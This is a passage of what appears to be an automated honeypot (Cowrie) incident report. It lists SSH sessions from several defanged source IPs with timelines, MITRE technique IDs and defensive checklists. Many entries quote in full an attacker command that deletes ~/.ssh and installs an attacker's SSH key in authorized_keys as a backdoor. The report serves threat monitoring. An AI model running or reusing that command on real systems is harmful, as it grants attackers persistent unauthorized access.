|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:18 |
| **Last Seen** | 2026-06-02 23:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:18:55` | `cowrie.session.connect` |
| `2026-06-02 23:18:55` | `cowrie.client.version` |
| `2026-06-02 23:18:55` | `cowrie.client.kex` |
| `2026-06-02 23:18:56` | `cowrie.login.success` |
| `2026-06-02 23:18:56` | `cowrie.session.params` |
| `2026-06-02 23:18:56` | `cowrie.command.input` |
| `2026-06-02 23:18:56` | `cowrie.command.failed` |
| `2026-06-02 23:18:57` | `cowrie.log.closed` |
| `2026-06-02 23:18:57` | `cowrie.session.params` |
| `2026-06-02 23:18:57` | `cowrie.command.input` |
| `2026-06-02 23:18:57` | `cowrie.session.file_download` |
| `2026-06-02 23:18:57` | `cowrie.log.closed` |
| `2026-06-02 23:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff09de47917

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:18 |
| **Last Seen** | 2026-06-02 23:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:18:59` | `cowrie.session.connect` |
| `2026-06-02 23:18:59` | `cowrie.client.version` |
| `2026-06-02 23:19:00` | `cowrie.client.kex` |
| `2026-06-02 23:19:00` | `cowrie.login.success` |
| `2026-06-02 23:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464409166069

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:20 |
| **Last Seen** | 2026-06-02 23:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:20:31` | `cowrie.session.connect` |
| `2026-06-02 23:20:31` | `cowrie.client.version` |
| `2026-06-02 23:20:32` | `cowrie.client.kex` |
| `2026-06-02 23:20:32` | `cowrie.login.success` |
| `2026-06-02 23:20:33` | `cowrie.session.params` |
| `2026-06-02 23:20:33` | `cowrie.command.input` |
| `2026-06-02 23:20:33` | `cowrie.command.failed` |
| `2026-06-02 23:20:33` | `cowrie.log.closed` |
| `2026-06-02 23:20:33` | `cowrie.session.params` |
| `2026-06-02 23:20:33` | `cowrie.command.input` |
| `2026-06-02 23:20:33` | `cowrie.session.file_download` |
| `2026-06-02 23:20:33` | `cowrie.log.closed` |
| `2026-06-02 23:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdcffefc62b3

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:20 |
| **Last Seen** | 2026-06-02 23:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:20:36` | `cowrie.session.connect` |
| `2026-06-02 23:20:36` | `cowrie.client.version` |
| `2026-06-02 23:20:36` | `cowrie.client.kex` |
| `2026-06-02 23:20:36` | `cowrie.login.success` |
| `2026-06-02 23:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60400183619

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]86` |
| **First Seen** | 2026-06-02 23:21 |
| **Last Seen** | 2026-06-02 23:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:21:16` | `cowrie.session.connect` |
| `2026-06-02 23:21:16` | `cowrie.client.version` |
| `2026-06-02 23:21:16` | `cowrie.client.kex` |
| `2026-06-02 23:21:16` | `cowrie.login.success` |
| `2026-06-02 23:21:16` | `cowrie.session.params` |
| `2026-06-02 23:21:16` | `cowrie.command.input` |
| `2026-06-02 23:21:16` | `cowrie.command.failed` |
| `2026-06-02 23:21:16` | `cowrie.log.closed` |
| `2026-06-02 23:21:17` | `cowrie.session.params` |
| `2026-06-02 23:21:17` | `cowrie.command.input` |
| `2026-06-02 23:21:17` | `cowrie.session.file_download` |
| `2026-06-02 23:21:17` | `cowrie.log.closed` |
| `2026-06-02 23:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f8d8f4bb91

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:21 |
| **Last Seen** | 2026-06-02 23:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:21:18` | `cowrie.session.connect` |
| `2026-06-02 23:21:18` | `cowrie.client.version` |
| `2026-06-02 23:21:18` | `cowrie.client.kex` |
| `2026-06-02 23:21:18` | `cowrie.login.success` |
| `2026-06-02 23:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b989b665c874

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:23 |
| **Last Seen** | 2026-06-02 23:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:23:37` | `cowrie.session.connect` |
| `2026-06-02 23:23:37` | `cowrie.client.version` |
| `2026-06-02 23:23:37` | `cowrie.client.kex` |
| `2026-06-02 23:23:38` | `cowrie.login.success` |
| `2026-06-02 23:23:38` | `cowrie.session.params` |
| `2026-06-02 23:23:38` | `cowrie.command.input` |
| `2026-06-02 23:23:38` | `cowrie.command.failed` |
| `2026-06-02 23:23:38` | `cowrie.log.closed` |
| `2026-06-02 23:23:39` | `cowrie.session.params` |
| `2026-06-02 23:23:39` | `cowrie.command.input` |
| `2026-06-02 23:23:39` | `cowrie.session.file_download` |
| `2026-06-02 23:23:39` | `cowrie.log.closed` |
| `2026-06-02 23:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538bf093f81a

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:23 |
| **Last Seen** | 2026-06-02 23:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:23:41` | `cowrie.session.connect` |
| `2026-06-02 23:23:41` | `cowrie.client.version` |
| `2026-06-02 23:23:41` | `cowrie.client.kex` |
| `2026-06-02 23:23:42` | `cowrie.login.success` |
| `2026-06-02 23:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee12c2fbab00

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:24 |
| **Last Seen** | 2026-06-02 23:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:24:16` | `cowrie.session.connect` |
| `2026-06-02 23:24:16` | `cowrie.client.version` |
| `2026-06-02 23:24:16` | `cowrie.client.kex` |
| `2026-06-02 23:24:16` | `cowrie.login.success` |
| `2026-06-02 23:24:16` | `cowrie.session.params` |
| `2026-06-02 23:24:16` | `cowrie.command.input` |
| `2026-06-02 23:24:16` | `cowrie.command.failed` |
| `2026-06-02 23:24:17` | `cowrie.log.closed` |
| `2026-06-02 23:24:17` | `cowrie.session.params` |
| `2026-06-02 23:24:17` | `cowrie.command.input` |
| `2026-06-02 23:24:17` | `cowrie.session.file_download` |
| `2026-06-02 23:24:17` | `cowrie.log.closed` |
| `2026-06-02 23:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21913e57faca

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:24 |
| **Last Seen** | 2026-06-02 23:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:24:18` | `cowrie.session.connect` |
| `2026-06-02 23:24:18` | `cowrie.client.version` |
| `2026-06-02 23:24:18` | `cowrie.client.kex` |
| `2026-06-02 23:24:18` | `cowrie.login.success` |
| `2026-06-02 23:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b5f6101925

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:27 |
| **Last Seen** | 2026-06-02 23:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:27:44` | `cowrie.session.connect` |
| `2026-06-02 23:27:44` | `cowrie.client.version` |
| `2026-06-02 23:27:44` | `cowrie.client.kex` |
| `2026-06-02 23:27:44` | `cowrie.login.success` |
| `2026-06-02 23:27:44` | `cowrie.session.params` |
| `2026-06-02 23:27:44` | `cowrie.command.input` |
| `2026-06-02 23:27:44` | `cowrie.command.failed` |
| `2026-06-02 23:27:45` | `cowrie.log.closed` |
| `2026-06-02 23:27:45` | `cowrie.session.params` |
| `2026-06-02 23:27:45` | `cowrie.command.input` |
| `2026-06-02 23:27:45` | `cowrie.session.file_download` |
| `2026-06-02 23:27:45` | `cowrie.log.closed` |
| `2026-06-02 23:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99c2c2c55c1

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:27 |
| **Last Seen** | 2026-06-02 23:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:27:46` | `cowrie.session.connect` |
| `2026-06-02 23:27:46` | `cowrie.client.version` |
| `2026-06-02 23:27:46` | `cowrie.client.kex` |
| `2026-06-02 23:27:46` | `cowrie.login.success` |
| `2026-06-02 23:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d5d9c6091e

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:28 |
| **Last Seen** | 2026-06-02 23:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:28:27` | `cowrie.session.connect` |
| `2026-06-02 23:28:27` | `cowrie.client.version` |
| `2026-06-02 23:28:27` | `cowrie.client.kex` |
| `2026-06-02 23:28:28` | `cowrie.login.success` |
| `2026-06-02 23:28:29` | `cowrie.session.params` |
| `2026-06-02 23:28:29` | `cowrie.command.input` |
| `2026-06-02 23:28:29` | `cowrie.command.failed` |
| `2026-06-02 23:28:29` | `cowrie.log.closed` |
| `2026-06-02 23:28:29` | `cowrie.session.params` |
| `2026-06-02 23:28:29` | `cowrie.command.input` |
| `2026-06-02 23:28:29` | `cowrie.session.file_download` |
| `2026-06-02 23:28:29` | `cowrie.log.closed` |
| `2026-06-02 23:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3274d3b5d2

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:28 |
| **Last Seen** | 2026-06-02 23:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:28:32` | `cowrie.session.connect` |
| `2026-06-02 23:28:32` | `cowrie.client.version` |
| `2026-06-02 23:28:32` | `cowrie.client.kex` |
| `2026-06-02 23:28:33` | `cowrie.login.success` |
| `2026-06-02 23:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2096acbc780

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:28 |
| **Last Seen** | 2026-06-02 23:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:28:48` | `cowrie.session.connect` |
| `2026-06-02 23:28:48` | `cowrie.client.version` |
| `2026-06-02 23:28:48` | `cowrie.client.kex` |
| `2026-06-02 23:28:48` | `cowrie.login.success` |
| `2026-06-02 23:28:48` | `cowrie.session.params` |
| `2026-06-02 23:28:48` | `cowrie.command.input` |
| `2026-06-02 23:28:48` | `cowrie.command.failed` |
| `2026-06-02 23:28:48` | `cowrie.log.closed` |
| `2026-06-02 23:28:48` | `cowrie.session.params` |
| `2026-06-02 23:28:48` | `cowrie.command.input` |
| `2026-06-02 23:28:48` | `cowrie.session.file_download` |
| `2026-06-02 23:28:48` | `cowrie.log.closed` |
| `2026-06-02 23:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e791f407c9

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:28 |
| **Last Seen** | 2026-06-02 23:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:28:56` | `cowrie.session.connect` |
| `2026-06-02 23:28:56` | `cowrie.client.version` |
| `2026-06-02 23:28:57` | `cowrie.client.kex` |
| `2026-06-02 23:28:57` | `cowrie.login.success` |
| `2026-06-02 23:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb7bc213fb15

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:30 |
| **Last Seen** | 2026-06-02 23:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:30:09` | `cowrie.session.connect` |
| `2026-06-02 23:30:09` | `cowrie.client.version` |
